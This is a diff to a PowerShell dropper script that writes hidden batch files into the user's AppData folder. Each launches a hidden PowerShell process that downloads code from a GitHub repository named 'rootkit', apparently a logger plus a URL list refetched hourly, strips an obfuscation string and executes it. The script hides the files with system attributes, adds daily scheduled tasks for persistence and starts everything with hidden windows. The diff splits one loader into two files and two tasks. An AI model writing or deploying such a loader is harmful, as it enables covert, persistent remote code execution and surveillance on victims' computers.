@@ -55,15 +55,22 @@ function Set_bootACL($filepath)
 	attrib +S +H $filepath
 }
 
-$paFile        = $env:appdata + '\koau.bat'
+$pa1File        = $env:appdata + '\koau1.bat'
+$pa2File        = $env:appdata + '\koau2.bat'
+
 $content1 ="cmd /c start /min powershell start-process powershell {[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/logger')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;} -windowstyle hidden"
 $content2 = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/urls.ps1')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;start-sleep -s 3600}} -windowstyle hidden"
-$sef = $content1 + "`r`n" + "timeout `/t 1 `/nobreak >nul" + "`r`n" + $content2
-sc -Path $paFile -Value $sef -Encoding 'ascii'
+# $sef = $content1 + "`r`n" + "timeout `/t 1 `/nobreak >nul" + "`r`n" + $content2
+sc -Path $pa1File -Value $content1 -Encoding 'ascii'
+sc -Path $pa2File -Value $content2 -Encoding 'ascii'
 # sc $paFile $content2 -Encoding 'utf8'
-Set_bootACL($paFile)
-schtasks /create /tn "koauSche" /tr "$paFile" /sc daily /st 01:35 /f
-Start-Process -FilePath $paFile -WindowStyle Hidden
+Set_bootACL($pa1File)
+Set_bootACL($pa2File)
+schtasks /create /tn "koauSche1" /tr "$pa1File" /sc daily /st 01:35 /f
+schtasks /create /tn "koauSche2" /tr "$pa2File" /sc daily /st 01:35 /f
+Start-Process -FilePath $pa1File -WindowStyle Hidden
+Start-Process -FilePath $pa2File -WindowStyle Hidden
+
 # schtasks /create /tn "koauSche" /tr "$paFile" /sc onlogon
 
 
